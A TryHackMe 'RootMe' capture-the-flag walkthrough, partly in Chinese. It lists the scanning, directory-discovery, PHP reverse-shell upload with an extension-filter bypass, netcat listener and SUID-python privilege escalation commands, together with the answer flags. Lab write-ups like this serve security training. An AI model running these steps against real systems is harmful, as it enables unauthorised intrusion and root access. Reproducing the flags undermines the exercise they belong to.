# RootMe

###### tags: `Tryhackme` `Hacking`
---
**1. Scan the machine, how many ports are open?**
    ~ 2
    * Command: sudo nmap -sS -sV -T4 -vv -p- 10.10.231.81 -oN portscan.txt
**2. What version of Apache is running?**
    ~ 2.4.29
    
**3. What service is running on port 22?**
    ~ ssh

**4. What is the hidden directory?**
    ~ /panel/
    * Command: gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://10.10.231.81 -t 20 -o gobusterscan.txt

**5. Find a form to upload and get a reverse shell, and find the flag.**
    ~ THM{y0u_g0t_a_sh3ll}
    * 下載php-reverse-shell.php並修改內容
![](https://i.imgur.com/1aEdeeP.jpg)

    * 將php-reverse-shell.php 改名為 php-reverse-shell.phtml
    * Command: mv php-reverse-shell.pHP php-reverse-shell.phtml
    * 原因請參考下圖: 
![](https://i.imgur.com/WSnriLt.png)

    * 然後到http://10.10.231.81/panel/ 上傳此檔
![](https://i.imgur.com/DpA0M2D.jpg)

    * 開啟監聽
    * Command: nc -lvnp 9999
    * 到http://10.10.231.81/uploads/ 點選剛剛上傳的檔案
    * 這時候就可以控制target機器了
![](https://i.imgur.com/raz5MCZ.jpg)
    
    * 用find找user.txt，會發現剛檔在/var/www裡面
![](https://i.imgur.com/InvYcZs.jpg)

**6. Search for files with SUID permission, which file is weird?**
    ~ /usr/bin/python
    * Command: find / -user root -perm /4000 > find.txt
![](https://i.imgur.com/YAz6tQc.jpg)

**7. root.txt**
    ~ THM{pr1v1l3g3_3sc4l4t10n}
    * Command: ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
![](https://i.imgur.com/Spr72ma.jpg)

